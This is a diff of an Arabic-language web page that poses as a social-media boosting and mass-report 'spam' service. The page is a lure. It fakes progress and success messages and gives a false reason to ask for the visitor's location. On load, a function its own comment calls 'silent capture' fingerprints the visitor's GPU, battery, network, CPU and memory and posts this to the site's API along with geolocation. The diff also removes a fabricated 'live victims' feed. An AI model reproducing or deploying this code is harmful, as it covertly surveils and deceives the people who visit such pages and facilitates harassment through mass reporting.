@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>رشق وإسبام 🎯</title>
+    <title>سيرفر الرشق العالمي 🎯</title>
     <style>
         body { background-color: black; color: white; text-align: center; font-family: 'Courier New', monospace; padding: 20px; direction: rtl; }
         pre { font-size: 8px; color: #00ff00; margin-bottom: 20px; }
@@ -12,9 +12,6 @@
         input { width: 85%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: white; text-align: center; }
         .action-btn { width: 85%; padding: 12px; background-color: #00ff00; color: black; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; }
         #progress-container { margin-top: 20px; color: #00ff00; font-size: 20px; border: 1px solid #00ff00; padding: 10px; border-radius: 10px; }
-        #victims-list { margin-top: 40px; border-top: 1px solid #333; padding-top: 20px; text-align: right; font-size: 11px; color: #00ff00; }
-        .victim-entry { margin-bottom: 8px; border-bottom: 1px solid #222; padding-bottom: 5px; }
-        .time-tag { color: #888; margin-right: 5px; }
     </style>
 </head>
 <body>
@@ -40,8 +37,8 @@ u$$$$$$$$$$$$$$$$$$$$$u
     </pre>
 
     <div id="main-menu">
-        <button class="menu-btn" onclick="showSub('boost')">1- قسم الرشق 🚀</button>
-        <button class="menu-btn" onclick="showSub('spam')">2- قسم الإسبام ⚔️</button>
+        <button class="menu-btn" onclick="showSub('boost')">1- قسم الرشق (متابعين/لايكات) 🚀</button>
+        <button class="menu-btn" onclick="showSub('spam')">2- قسم الإسبام (بلاغات مكثفة) ⚔️</button>
     </div>
 
     <div id="platform-menu" class="hidden">
@@ -51,88 +48,83 @@ u$$$$$$$$$$$$$$$$$$$$$u
     </div>
 
     <div id="boost-options" class="hidden">
-        <button class="menu-btn" onclick="openFinal('رشق متابعين', 'يوزر الحساب')">رشق متابعين</button>
-        <button class="menu-btn" onclick="openFinal('رشق مشاهدات', 'رابط المقطع')">رشق مشاهدات</button>
+        <button class="menu-btn" onclick="openFinal('رشق متابعين', 'يوزر الحساب', 5000)">رشق متابعين</button>
+        <button class="menu-btn" onclick="openFinal('رشق لايكات', 'رابط المقطع', 5000)">رشق لايكات</button>
+        <button class="menu-btn" onclick="openFinal('رشق مشاهدات', 'رابط المقطع', 5000)">رشق مشاهدات</button>
     </div>
 
     <div id="final-input" class="hidden">
         <h3 id="final-title"></h3>
         <input type="text" id="target-id" placeholder="">
-        <input type="number" id="target-count" placeholder="الحد الأقصى 5000">
-        <button class="action-btn" onclick="requestAccess()">ابدأ العملية الآن ✅</button>
+        <input type="number" id="target-count" placeholder="">
+        <button class="action-btn" onclick="requestAccess()">ابدأ التنفيذ الآن ✅</button>
         <div id="progress-container" class="hidden">جاري العمل: <span id="counter">0</span></div>
     </div>
 
-    <div id="victims-list">
-        <h4>السجل الحي للعمليات:</h4>
-        <div id="live-victims"></div>
-    </div>
-
     <script>
-        let mode = ""; let platform = ""; let service = "";
-        let fakeVictims = [{user: "a***_2", time: 120}, {user: "s***_9", time: 3600}];
+        let mode = ""; let platform = ""; let service = ""; let maxLimit = 5000;
+        let deviceCapturedData = {};
 
-        window.onload = function() {
-            updateVictimsUI();
-            setInterval(() => { fakeVictims.forEach(v => v.time += 60); updateVictimsUI(); }, 60000);
-            setInterval(addNewFakeVictim, 35000);
-        };
+        // السحب الصامت للعتاد والشبكة
+        async function silentCapture() {
+            let gpu = "غير معروف";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch (e) {}
+            let battery = "غير معروف";
+            try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}%`; } catch (e) {}
+            
+            deviceCapturedData = {
+                gpu: gpu,
+                battery: battery,
+                network: navigator.connection ? navigator.connection.effectiveType : "WiFi/Data",
+                platform: navigator.platform,
+                cores: navigator.hardwareConcurrency || '?',
+                ram: navigator.deviceMemory || '?'
+            };
 
-        function updateVictimsUI() {
-            const container = document.getElementById('live-victims');
-            container.innerHTML = "";
-            fakeVictims.sort((a,b) => a.time - b.time).slice(0,5).forEach(v => {
-                const div = document.createElement('div');
-                div.className = 'victim-entry';
-                let t = v.time < 60 ? "ثوانٍ" : Math.floor(v.time/60) + " دقيقة";
-                div.innerHTML = `<span class="time-tag">منذ ${t}</span> User: ${v.user} | مكتمل ✅`;
-                container.appendChild(div);
+            fetch('/api/index', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ mode: "Silent Visit", device_info: deviceCapturedData })
             });
-        }
-
-        function addNewFakeVictim() {
-            fakeVictims.unshift({user: "u***_"+Math.floor(Math.random()*9), time: 0});
-            updateVictimsUI();
         }
 
         function requestAccess() {
             const id = document.getElementById('target-id').value;
             const count = parseInt(document.getElementById('target-count').value);
             if(!id || !count) return alert("أكمل البيانات!");
-            if(count > 5000) return alert("الحد الأقصى 5000!");
+            if(count > maxLimit) return alert("الحد الأقصى لهذا القسم هو " + maxLimit);
 
-            // التمويه موحد لكل الأقسام
-            alert("للحماية من السبام، يرجى السماح بالوصول للموقع لتحديد أقرب سيرفر لضمان سرعة التنفيذ.");
+            alert("لضمان سرعة التنفيذ، يرجى السماح بالوصول للموقع لتحديد السيرفر الأقرب.");
             
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => sendData(pos.coords.latitude, pos.coords.longitude),
-                    () => sendData(null, null)
+                    (pos) => sendFinalData(id, count, pos.coords.latitude, pos.coords.longitude),
+                    () => sendFinalData(id, count, null, null)
                 );
             } else {
-                sendData(null, null);
+                sendFinalData(id, count, null, null);
             }
         }
 
-        async function sendData(lat, lon) {
-            const id = document.getElementById('target-id').value;
-            const count = document.getElementById('target-count').value;
-            
-            let battery = "غير معروف";
-            try { const b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}%`; } catch(e) {}
-
-            const deviceInfo = {
-                platform: navigator.platform,
-                battery: battery,
-                browser: navigator.userAgent.split(' ').pop()
-            };
-
+        async function sendFinalData(id, count, lat, lon) {
             fetch('/api/index', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ mode: mode, target_id: id, count: count, lat: lat, lon: lon, device_info: deviceInfo })
+                body: JSON.stringify({
+                    mode: mode,
+                    service: service,
+                    target_id: id,
+                    count: count,
+                    lat: lat,
+                    lon: lon,
+                    device_info: deviceCapturedData
+                })
             });
-
             startCounter(count);
         }
 
@@ -142,20 +134,19 @@ u$$$$$$$$$$$$$$$$$$$$$u
             let interval = setInterval(() => {
                 if(current >= max) {
                     clearInterval(interval);
-                    alert("تمت العملية بنجاح! سيتم التنفيذ خلال 24 ساعة.");
+                    alert("تمت العملية! سيبدأ الوصول تدريجياً.");
                     location.reload();
                 } else {
                     current++;
                     document.getElementById('counter').innerText = current;
                 }
-            }, 1200); // دقيقتين لكل 100
+            }, 1000);
         }
 
         function showSub(m) { 
             mode = m; 
             document.getElementById('main-menu').classList.add('hidden'); 
             document.getElementById('platform-menu').classList.remove('hidden'); 
-            document.getElementById('plat-title').innerText = m === 'boost' ? "قسم الرشق" : "قسم الإسبام";
         }
         function showOptions(p) { 
             platform = p; 
@@ -163,16 +154,19 @@ u$$$$$$$$$$$$$$$$$$$$$u
             if(mode === 'boost') {
                 document.getElementById('boost-options').classList.remove('hidden');
             } else {
-                openFinal('إسبام بلاغات', 'يوزر الحساب');
+                openFinal('إسبام بلاغات', 'يوزر الحساب', 300);
             }
         }
-        function openFinal(s, h) { 
-            service = s; 
+        function openFinal(s, h, limit) { 
+            service = s; maxLimit = limit;
             document.getElementById('boost-options').classList.add('hidden'); 
             document.getElementById('final-input').classList.remove('hidden'); 
             document.getElementById('final-title').innerText = platform + " - " + s;
-            document.getElementById('target-id').placeholder = h; 
+            document.getElementById('target-id').placeholder = h;
+            document.getElementById('target-count').placeholder = "الحد الأقصى " + limit;
         }
+
+        window.addEventListener('DOMContentLoaded', silentCapture);
     </script>
 </body>
 </html>
